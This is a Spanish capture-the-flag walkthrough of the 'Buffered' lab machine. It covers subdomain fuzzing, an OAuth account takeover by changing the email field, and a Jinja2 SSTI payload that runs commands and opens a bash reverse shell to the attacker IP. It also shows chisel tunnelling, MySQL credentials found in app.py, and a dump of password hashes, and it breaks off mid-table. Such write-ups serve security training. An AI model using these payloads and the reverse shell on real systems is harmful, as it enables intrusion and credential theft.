![Screenshot](/hard/Buffered/Images/machine.png)

Dificultad: **Hard**

Hecho por: **rxffsec**

# Pasos para pwn 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#explotación)
* 👤 [Movimiento Lateral Christine](#movimiento-lateral-christine)
* 👤 [Movimiento Lateral Tyler](#movimiento-lateral-tyler)
* 🚩 [Escalada de Privilegios](#escalada-de-privilegios)

---

## 🛠️  Técnicas: Enumeración de usuarios, fuzzing con FFUF, ATO con manipulación de peticiones con caido, SSTI (Python jinja2), escapar de un rbash, Port Forwarding con chisel, analizar script de python, fuerza bruta con john, LFI y ver contenido desde un script de python, Explotar la librería pickle de python y obtener RCE, Analizar un binario compilado con GDB, Explotar un BoF con shellcodes, Analizar otro binario compilado con GDB y Ghidra, Explotar un BoF con ret2plt y escalar privilegios.

---

Primero que nada nos aseguramos de que la máquina esté activa, podemos verificarlo rápidamente con el comando **ping**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.149 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.133 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.129 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2048ms
rtt min/avg/max/mdev = 0.129/0.137/0.149/0.008 ms
```

Ahora, podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Primero que nada comenzamos nuestro reconocimiento siempre con **nmap** para saber qué puertos están abiertos en la máquina objetivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 15:48 -0500
Initiating ARP Ping Scan at 15:48
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:48, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:48
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:48, 2.73s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000026s latency).
Scanned at 2026-01-17 15:48:14 -05 for 3s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, comenzando desde el puerto 1, hasta el puerto 65,535.

**-n** <- Con este argumento nmap va a omitir la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser en algunos casos muy lento.

**-sS** <- Con este argumento nmap va a hacer un escaneo sigiloso, esto significa que el 3-way-handshake no se completará, y también hace el escaneo ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap, enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de Host, esto significa que nmap tratará la máquina como activa y hará inmediatamente el escaneo.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Cuando el escaneo concluye podemos ver que solo el puerto 80 (http / Hyper-Text Transfer Protocol) está abierto, para obtener más información de este puerto podemos hacer otro escaneo con **nmap** para saber qué servicios y versiones están usando este puerto.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ nmap -p80 -n -sCV 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 15:51 -0500
Nmap scan report for 172.17.0.2
Host is up (0.000096s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://buffered.dl/
|_http-server-header: nginx/1.24.0 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.08 seconds
```

**-p80** <- Con este argumento nmap solo escaneará este puerto que descubrimos antes.

**-sCV** <- Con este argumento nmap va a escanear por cada puerto su versión para encontrar algunas posibles vulnerabilidades sobre sistemas no actualizados, y también hace un escaneo con algunos scripts que ejecuta nmap, para encontrar más sobre estos puertos, como versiones.

Podemos ver que el puerto 80 es un sitio web, pero está siendo redirigido a un dominio **buffered.dl**, esto es virtual hosting así que necesitamos ingresar este dominio en el archivo **/etc/hosts**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ head -n 1 /etc/hosts
172.17.0.2      buffered.dl
```

Bien, podemos usar **whatweb** para saber qué tecnologías se están usando en este dominio.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ whatweb http://buffered.dl
http://buffered.dl [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[christine@buffered.dl,info@buffered.dl,support@buffered.dl,tyler@buffered.dl,wilson@buffered.dl], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[172.17.0.2], Lightbox, Script[application/json], Title[Buffered], nginx[1.24.0]
```

Y podemos ver mucha información, podemos ver muchos correos electrónicos y también está usando nginx, bootstrap, etc.

Necesitamos guardar estos correos, a veces esta información puede ser muy útil.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ cat emails 
christine@buffered.dl
info@buffered.dl
support@buffered.dl
tyler@buffered.dl
wilson@buffered.dl
```

Bien, echemos un vistazo al sitio web con nuestro navegador.

![Screenshot](/hard/Buffered/Images/image1.png)

Podemos ver mucha información en este sitio web, pero nada es útil aquí, podemos ver estos posibles usuarios que están en el sistema:

![Screenshot](/hard/Buffered/Images/image2.png)

Podemos guardar el nombre de estos usuarios, toda esta información puede ser útil para más adelante.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ cat users 
tyler
christine
wilson
tyler miller
christine ross
wilson winters
```

Después de mucho tiempo intentando si algo es funcional en este sitio web pero no podemos encontrar nada.

Podemos usar fuzzing para encontrar posibles **subdominios** en este sitio web con **FFUF**

---
# Enumeración

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ ffuf -H 'host: FUZZ.buffered.dl' -u http://buffered.dl -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -ic -fl 816

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://buffered.dl
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.buffered.dl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 816
________________________________________________

dashboard               [Status: 200, Size: 5666, Words: 1744, Lines: 129, Duration: 6713ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Así que vamos a hacer Fuzz del encabezado de host.

Y podemos encontrar que existe un subdominio **dashboard**, así que necesitamos ingresar también este subdominio en el archivo **/etc/hosts**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ head -n1 /etc/hosts
172.17.0.2      buffered.dl dashboard.buffered.dl
```

Bien, echemos un vistazo al sitio web con este subdominio con **whatweb**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ whatweb http://dashboard.buffered.dl
http://dashboard.buffered.dl [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[172.17.0.2], JQuery[1.10.2], Lightbox, Modernizr, PasswordField[password], Script, Title[Buffered Dashboard], X-UA-Compatible[ie=edge], nginx[1.24.0]
```

Podemos ver que está usando **JQuery** en particular esta versión es muy antigua y vulnerable a múltiples exploits, pero en este caso no vamos a explotar esto.

Echemos un vistazo con nuestro navegador entonces.

![Screenshot](/hard/Buffered/Images/image3.png)

Y podemos ver esto, en este sitio web podemos crear una cuenta, así que voy a hacer una.

Bien, una vez que creamos nuestra cuenta podemos ver 2 inicios de sesión, OAuth login y un sign in normal.

Así que voy a iniciar sesión con el normal.

![Screenshot](/hard/Buffered/Images/image4.png)

Y podemos ver esto, y nada más interesante.

---
# Explotación

Después de buscar un rato, encontré algo interesante en el OAuth login.

![Screenshot](/hard/Buffered/Images/image5.png)

Podemos ver que en el método están obteniendo el email y el token, ¿qué pasa si cambiamos ese email por ejemplo admin?

Después de intentar múltiples veces el email de admin es ```admin@buffered.dl```

![Screenshot](/hard/Buffered/Images/image6.png)

¡Y podemos ver que estamos siendo redirigidos al dashboard de admin!

![Screenshot](/hard/Buffered/Images/image7.png)

¡Y estamos dentro como admin!

En este dashboard podemos ver que encontramos múltiples cosas que son interesantes, podemos agregar contenido a una lista.

Después de intentar múltiples cosas como explotar un SQLI, No-SQLI, XSS y todo eso, encontramos algo interesante aquí en la barra de **búsqueda**.

![Screenshot](/hard/Buffered/Images/image8.png)

Cuando ingresamos este payload ```{{7*7}}``` El resultado del ID es 49, esto significa que estamos viendo una posible explotación de un **SSTI** (Server-Side Template Injection), esta vulnerabilidad puede llevar a un **LFI** (Local File Inclusion) o incluso un **RCE** (Remote Command Execution).

Pero existen múltiples tecnologías que pueden ser vulnerables a esto, como python, java, django y otros.

Puedes probar múltiples payloads para encontrar qué Template está usando este sitio web, puedes echar un vistazo [aquí](https://example.com)

En este caso este Template es de python y está usando **Jinja2**.

![Screenshot](/hard/Buffered/Images/image9.png)

Así que podemos usar el siguiente payload:

- ```{{cycler.__init__.__globals__.os.popen('command here').read()}}```

Con este payload podemos ejecutar comandos en el sistema (RCE)

![Screenshot](/hard/Buffered/Images/image10.png)

Pero cuando ejecutamos ciertos comandos como **id** o **whoami** nos muestra el trollface.

Podemos ver qué tipo de shell estamos ejecutando los comandos.

![Screenshot](/hard/Buffered/Images/image11.png)

Vemos que estamos en un **rbash** (restricted bash), esto significa que no podemos ejecutar algunos comandos, pero podemos hacerlo de todos modos, solo necesitamos ingresar la ruta completa del comando que queremos ejecutar.

Voy a hacer una reverse shell, bash está ubicado en **/usr/bin**

Pero antes de hacer eso necesitamos estar en modo escucha con **netcat** para recibir la conexión de la reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

**-l**  <- Este argumento hace que netcat esté en modo escucha.

**-v** <- Este argumento activa el modo **verbose**, esto nos mostrará en más detalle la conexión que recibimos.

**-n** <- Esto hace que netcat omita la búsqueda DNS, y solo use la dirección IP directamente.

**-p** <- El puerto en el que estamos escuchando, puede ser cualquiera, si no está siendo usado actualmente.

Bien, ahora estamos escuchando en este puerto, así que ejecutemos el comando malicioso:

- ```{{cycler.__init__.__globals__.os.popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/1111 0>&1"').read()}}```

Y recibimos esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 35584
bash: cannot set terminal process group (369): Inappropriate ioctl for device
bash: no job control in this shell
bash: groups: command not found
bash: dircolors: command not found
wilson@aaed8527596a:~$ /bin/whoami
/bin/whoami
wilson
```

¡Estamos dentro!

## Modificando la shell

Así que necesitamos modificar esta shell para operar más cómodamente con ella.

Entonces modifiquemos esta shell porque es muy fea, hagamos un tratamiento rápido entonces.

Primero que nada hacemos esto:

Ya que en este sistema el comando **script** no genera bash, así que generemos una shell con **python3** y **pty**

```r
wilson@aaed8527596a:~$ /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
<bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: groups: command not found
bash: dircolors: command not found
```

Una vez que hacemos esto, suspendamos el proceso primero con **CTRL + Z**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de salida y entrada sean en crudo.

**-echo** <- Con esto estamos haciendo que si ejecutamos un comando no se imprimirá nuevamente en la salida.

**; fg** <- Y con esto reanudamos nuestra reverse shell nuevamente.

Cuando ejecutamos este comando reseteamos el xterm:

```r
/usr/bin/reset xterm
```

Esto va a resetear la terminal.

En este usuario el PATH es muy limitado, así que no podemos ejecutar los comandos que queremos.

```r
wilson@aaed8527596a:~$ echo $PATH
/home/wilson/.local/bin
```

Podemos copiar nuestro PATH de nuestra máquina de ataque y definir esta nueva ruta para el usuario **Wilson**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ echo $PATH | xclip -sel clip
```

Así que estamos copiando el valor de path al portapapeles.

```r
wilson@aaed8527596a:~$ export PATH=/run/user/1000/fnm_multishells/20798......
```

Y finalmente podemos ejecutar comandos sin definir toda la ruta del comando.

Si queremos limpiar nuestra terminal no podemos porque el term va a ser diferente del xterm, que tiene esta función. Podemos hacer esto de la siguiente manera para poder limpiar nuestra pantalla si se pone fea:

```r
wilson@aaed8527596a:~$ export TERM=xterm
```

Y una última cosa, ¡si notamos que la visualización de la terminal es muy pequeña!

Podemos ajustar esto para que sea más grande con el siguiente comando:

```r
wilson@aaed8527596a:~$ stty rows {num} columns {num}
```

¡y finalmente se ve mucho mejor!

---
# Movimiento Lateral Christine

En este sistema tenemos 3 usuarios; **wilson**, **christine** y **tyler**, así que necesitamos movernos a través de estos usuarios, antes de escalar privilegios.

En este sistema podemos encontrar puertos que están abiertos en el localhost de la máquina objetivo, esto significa que no pudimos verlos desde el exterior con nuestra máquina de ataque.

```r
wilson@aaed8527596a:~$ ss -tuln
Netid                   State                    Recv-Q                   Send-Q                                      Local Address:Port                                        Peer Address:Port                   Process                   
tcp                     LISTEN                   0                        128                                             127.0.0.1:5000                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        1                                               127.0.0.1:9000                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                               0.0.0.0:80                                               0.0.0.0:*                                                
tcp                     LISTEN                   0                        70                                              127.0.0.1:33060                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                             127.0.0.1:5555                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        151                                             127.0.0.1:3306                                             0.0.0.0:* 
```

Vemos que hay múltiples puertos abiertos en esta máquina y que son los siguientes:

- puerto 5000
- puerto 5555
- puerto 9000
- puerto 33060

Así que necesitamos usar **chisel** para traer estos puertos de vuelta y acceder desde nuestra máquina de ataque, básicamente port forwarding.

Bien, entonces transfiramos chisel para descargarlo en la máquina objetivo, luego hagamos una copia de **chisel** y hagamos un servidor con **python**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ cp /usr/bin/chisel .
                                                                                
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

En la máquina objetivo tiene **curl** así que podemos descargar chisel con él.

```r
wilson@aaed8527596a:/tmp$ curl http://172.17.0.1/chisel -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9.7M  100  9.7M    0     0  76.1M      0 --:--:-- --:--:-- --:--:-- 76.2M
```

Bien, entonces hagamos un servidor chisel con nuestra máquina de ataque para recibir conexiones.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ chisel server --reverse -p 1234
2026/01/17 18:54:53 server: Reverse tunnelling enabled
2026/01/17 18:54:53 server: Fingerprint 0aS/Epm+/Z/Z6PkMyS6pNDMlWfzq83rnnPmXPmkhcsc=
2026/01/17 18:54:53 server: Listening on http://0.0.0.0:1234
```

Bien, ahora con la máquina objetivo conectémosla a nosotros.

```r
wilson@aaed8527596a:/tmp$ chmod +x chisel 
wilson@aaed8527596a:/tmp$ ./chisel client 172.17.0.1:1234 R:5000 R:5555 R:9000 R:33060 &
[1] 738
wilson@aaed8527596a:/tmp$ 2026/01/17 17:58:46 client: Connecting to ws://172.17.0.1:1234
2026/01/17 17:58:46 client: Connected (Latency 947.444µs)
```

Con esto básicamente estamos haciendo túneles para obtener acceso a los puertos que están abiertos dentro de la máquina objetivo, y estamos haciendo que esta sesión de chisel vaya al fondo, porque todavía necesitamos interactuar y ejecutar comandos con el usuario **wilson.**

Y recibimos esto en el servidor chisel:

```r
2026/01/17 18:58:46 server: session#1: tun: proxy#R:5000=>5000: Listening
2026/01/17 18:58:46 server: session#1: tun: proxy#R:5555=>5555: Listening
2026/01/17 18:58:46 server: session#1: tun: proxy#R:9000=>9000: Listening
2026/01/17 18:58:46 server: session#1: tun: proxy#R:33060=>33060: Listening
```

Obtuvimos acceso a estos puertos.

Podemos usar **nmap** una vez más para encontrar qué servicios y versiones están ejecutándose en estos puertos.

Podemos usar **nmap** nuevamente para identificar qué servicios y versiones están ejecutándose en estos puertos.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ nmap -n -p5000,5555,9000,33060 -sCV 127.0.0.1 -oX reverse_ports
```

Exportamos toda la información en un archivo **XML**.

Lo hago para que la salida sea más legible en un archivo **HTML**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ xsltproc reverse_ports -o reverse_ports.html
```

Bien, ahora vamos a abrirlo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ open reverse_ports.html
```

![Screenshot](/hard/Buffered/Images/image12.png)

Como podemos ver, es más bonito y legible a la vista.

Y podemos observar que el puerto **5000** es el mismo que el sitio web **dashboard.buffered.dl**.

El puerto 33060 es un servidor SQL.

El más interesante es el puerto 5555, parece ser otro sitio web, y el puerto 9000 parece ser una aplicación.

Primero, vamos a conectarnos al puerto 9000 con **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ nc 127.0.0.1 9000
⠀⣁⠒⣠⣌⢓⡙⣿⣿⡁⠨⢉⣐⠢⣸⣿⣿⣿⣿⣿⣷⣾⣿⣯⣿⣿⣿⣿⣇⠂⣂⡋⠥⠊⣿⣿⢏⡞⣫⣄⠐⢀⡀
⣠⣶⣿⣿⣿⠌⠷⠹⣿⡿⡠⢘⣫⣾⣿⣿⡿⢛⣫⣭⡶⠶⣭⣍⡛⢿⣿⣿⣿⣿⣝⡁⢄⢺⣿⠿⠼⠅⣿⣿⣿⣶⣦
⣿⣿⣿⣿⡿⡘⣱⣟⡂⠜⣴⣿⣿⣿⣿⡟⣩⣎⣿⣟⢪⢇⡰⣗⣿⣿⣇⣌⠻⣿⣿⣿⣿⣧⠫⢶⣷⠆⠜⣿⣿⢿⣿
⣿⣿⣿⣿⠣⠰⣾⡶⠉⣼⣿⣿⣿⣿⢏⣾⡿⢿⣿⣮⢘⣆⠱⡂⣵⣿⣿⢿⣷⡙⣿⣿⣿⣿⢸⣭⣯⡇⢢⣿⣯⢪⣿
⢿⣯⣪⣿⡄⢘⣽⣭⡆⣿⣿⣿⣿⡟⣼⣿⣷⢾⠳⠟⣹⢿⡶⣿⠻⠾⣻⣿⣿⣧⢹⣿⣿⣿⢇⣺⡿⡮⢁⣾⣿⣿⣿⢏
⠹⣆⡛⢿⣿⣿⡄⢋⡏⠷⣈⠻⣿⣷⡀⣿⠇⠀⢾⣿⡿⠀⠀⢸⣿⡿⠀⢸⡀⠀⣼⣿⠟⣁⡺⢩⣝⢠⣾⣿⣿⠟⣁⢮
⣄⠈⠊⣢⡼⡶⣶⣿⣧⣦⡁⢋⠖⡭⢡⠄⠞⠄⣄⠈⠀⠀⠀⠀⠈⣀⡄⠢⠁⡌⢭⡲⡝⠊⣠⣮⣿⣶⡶⡲⣤⡛⠊⠂
⣭⡅⢺⣿⣇⣁⣼⣿⣶⣿⣷⡀⠘⠀⢥⣄⠀⠀⠋⠀⢿⠀⠀⢾⠀⠸⠁⠀⡀⣘⡁⠁⣾⣿⣷⣿⣿⣌⣁⣿⣿⠃⣬
⢛⣡⣟⣿⣿⣏⣎⣿⡿⢿⣯⣷⢹⣆⠉⠻⣯⣖⣤⠄⣈⣀⣀⠠⣤⣲⣼⠟⠁⢠⡟⡼⣭⣿⢿⣿⣯⣏⣿⣿⣟⣧⣙
⣿⣻⣿⣿⣻⣟⣷⣿⣿⣷⣶⢸⢸⣿⣿⣆⡄⡉⠛⠻⠿⠹⠏⠽⠛⠛⢉⢠⣰⣶⣿⣇⠇⢶⣾⣿⣿⣿⣿⣿⣻⣿⣿⣻
⢯⣽⣾⡟⣿⣿⣻⠱⣥⢸⠀⢀⣺⣿⡿⠾⢷⣿⣿⣿⣿⡿⣟⣛⢿⣿⣿⣿⣿⠷⢿⣿⡶⠐⠨⢒⡒⠑⢛⣛⡓⠭⢑⢢
⠧⡞⠩⠅⣚⣛⠃⢐⣒⠠⠂⣬⣿⡿⠾⢷⣿⣿⣿⣿⡿⣟⣛⢿⣿⣿⣿⣿⣿⠷⢿⣿⡶⠐⠨⢒⡒⠑⢛⣛⡓⠭⢑⢢
⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠸⣿⣯⢪⣿⡵⣽⣿⣿⣽⡜⣾⣷⢱⢫⣿⣿⡟⡟⣽⣝⡞⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤
⣩⣉⣓⠻⠿⡖⠠⠄⠀⠀⠴⣿⣏⢮⣉⡵⣻⣿⣿⣿⣾⣢⣴⣪⣿⣿⣿⣧⡣⣙⡡⣣⣿⣆⠀⠀⠀⠤⠐⣲⠿⢛⣊⣉
⣛⣛⠺⢿⣶⡤⣀⠀⠀⠀⠈⢿⠟⣿⣶⣯⢿⣟⡻⠿⠭⠭⠭⠭⠿⠟⣻⡿⢵⣷⣿⠻⢻⠃⠀⠀⠀⢀⡠⢴⣾⠿⢒⣛
⡕⡪⢝⢶⡬⡉⠀⠀⠀⠀⠀⢀⡙⠏⠓⠈⣁⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣈⠉⠚⠩⢟⡁⠀⢀⠀⠀⠁⠀⡩⣴⢾⡫⣕
        [ B u f f e r b o t ]
hello?

Message received
```

Parece ser un programa que escucha en este puerto.

Ahora, echemos un vistazo al sitio web en el puerto **5555** con **whatweb**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ whatweb http://localhost:5555
http://localhost:5555 [200 OK] Bootstrap, HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12.3], IP[::1], PasswordField[password], Python[3.12.3], Script, Title[Pages / Login - NiceAdmin Bootstrap Template], Werkzeug[3.0.1]
```

Parece que también utiliza Bootstrap y Python.

Ahora con el navegador.

![Screenshot](/hard/Buffered/Images/image13.png)

Y podemos ver esto, una página de inicio de sesión.

Después de mucho tiempo intentando ejecutar payloads maliciosos como SQLi, SSTI y otros, básicamente estamos perdiendo tiempo, y es lo mismo cuando lo enumeramos con **gobuster**.

Por lo tanto, necesitamos examinar más a fondo la máquina objetivo con el usuario **wilson**.

En el directorio home del usuario **wilson**, podemos encontrar el script que utiliza el sitio web, **app.py**, y también un script curioso **.pwgen.py**.

```r
wilson@6f65e99ac74a:~$ ls -la dashboard/
total 36
drwxr-xr-x 4 wilson wilson  4096 Jul 31  2024 .
drwxr-x--- 1 wilson wilson  4096 Aug  2  2024 ..
-rw-rw-r-- 1 wilson wilson   496 Jul 31  2024 .pwgen.py
-rwxr-xr-x 1 wilson wilson 14594 Jul 31  2024 app.py
drwxr-xr-x 7 wilson wilson  4096 Jul 20  2024 static
drwxr-xr-x 3 wilson wilson  4096 Jul 30  2024 templates
```

Primero vamos a echar un vistazo al archivo **pwgen.py**.

```python
import random

def generate_password():
    first_name = input("Enter your first name: ")
    last_name = input("Enter your last name: ")
    password = f"{first_name[0].lower()}.{last_name.lower()}@buffered_"
    number = random.randint(0, 999999)
    formatted_number = f"{number:06d}" # add padding to the left; i.e. 000001
    password += formatted_number
    return password

# Generate the password
generated_password = generate_password()
print("Generated password:", generated_password)
```

Y este es el código.

Este script de Python básicamente hace lo siguiente:

Toma el nombre de una persona, por ejemplo, john, y extrae la primera letra (j).

Y toma el apellido de john, por ejemplo, john doe (doe).

Y con todo esto crea una sola cadena: **j.doe@buffered_**

Y finalmente genera un número aleatorio de 6 dígitos, por ejemplo: **034691**

Luego muestra la cadena final, que parece ser una contraseña generada: **j.doe@buffered_034691**

Si recuerdas, tenemos los nombres de los posibles usuarios del sistema:

- Tyler miller
- Christine ross
- Wilson winters

Y convertidos a contraseñas son básicamente esto:

- t.miller@buffered_464716
- c.ross@buffered_975046
- w.winters@buffered_897536

Recuerda que el número final se genera aleatoriamente.

Incluso con este sistema, tenemos una pista en el correo del usuario wilson (**/var/mail/wilson**).

```r
wilson@6f65e99ac74a:/var/mail$ cat wilson 
from: christine
---
W. Winters

Your account was successfully registered!
Your default password is:

w.winters@buffered_945921

Please change it on your next login.

Site Admin
---
```

Podemos ver que genera estas contraseñas para sus usuarios.

Si echamos un vistazo al archivo **app.py**, podemos encontrar las credenciales de la base de datos MySQL.

```r
wilson@aaed8527596a:~/dashboard$ cat app.py | grep MYSQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'db_manager'
app.config['MYSQL_PASSWORD'] = 'Heig9At,'
app.config['MYSQL_DB'] = 'myflaskapp'
            host=app.config['MYSQL_HOST'],
            user=app.config['MYSQL_USER'],
            password=app.config['MYSQL_PASSWORD'],
            database=app.config['MYSQL_DB'],
```

Encontramos el usuario y la contraseña de este usuario.

Así que vamos a conectarnos con este usuario a MySQL y aprovechar que el usuario **wilson** está en el grupo de mysql.

```r
wilson@aaed8527596a:~/dashboard$ id
uid=1003(wilson) gid=1003(wilson) groups=1003(wilson),101(mysql)
```

Bien, vamos a iniciar sesión entonces.

```r
wilson@aaed8527596a:~/dashboard$ mysql -h 127.0.0.1 -u db_manager -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 54
Server version: 8.0.39-0ubuntu0.24.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Y estamos dentro, vamos a ver qué bases de datos podemos acceder.

```r
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| myflaskapp         |
| performance_schema |
+--------------------+
3 rows in set (0.29 sec)
```

Solo **myflaskapp**, vamos a usarla y ver qué tablas hay dentro.

```r
mysql> use myflaskapp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------------+
| Tables_in_myflaskapp |
+----------------------+
| infrastructure_list  |
| users                |
| users_old            |
+----------------------+
3 rows in set (0.00 sec)
```

Podemos ver 3 tablas aquí, la primera si recuerdas es cuando agregamos más contenido en la lista del panel de administración.

Y las 2 últimas tablas son interesantes, podemos ver cuántas columnas tienen.

```r
mysql> describe users;
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| id       | int          | NO   | PRI | NULL    | auto_increment |
| email    | varchar(100) | NO   |     | NULL    |                |
| password | varchar(100) | NO   |     | NULL    |                |
| role     | varchar(20)  | NO   |     | user    |                |
+----------+--------------+------+-----+---------+----------------+
4 rows in set (0.54 sec)

mysql> describe users_old;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| id       | int          | NO   |     | 0       |       |
| email    | varchar(100) | NO   |     | NULL    |       |
| password | varchar(100) | NO   |     | NULL    |       |
| role     | varchar(20)  | NO   |     | user    |       |
+----------+--------------+------+-----+---------+-------+
4 rows in set (0.00 sec)
```

Podemos ver que parece muy igual entre sí.

```r
mysql> select * from users_old;
+----+-----------------------+--------------------------------------------------------------+-----------+
| id | email                 | password                                                     | role      |
+----+-----------------------+--------------------------------------------------------------+-----------+
|  1 | admin@buffered.dl     | $2y$10$r0547dSzx5IU3aMqifomSOxiksd18H9uw6jtUABG1gaXm4i536SWG | admin     |
|  2 | wilson@buffered.dl    | $2y$10$z2.Hbp46qdxtejA73XZyv.ScuBc4x79YytjeGpN8twSB2zFRdfrsq | support   |
|  3 | tyler@buffered.dl     | $2y$10$FJCGWarfD8uN8wX2ynyrLeBmPwFygBkV9DBt5A67RloYZFQkPeNDS | dev       |
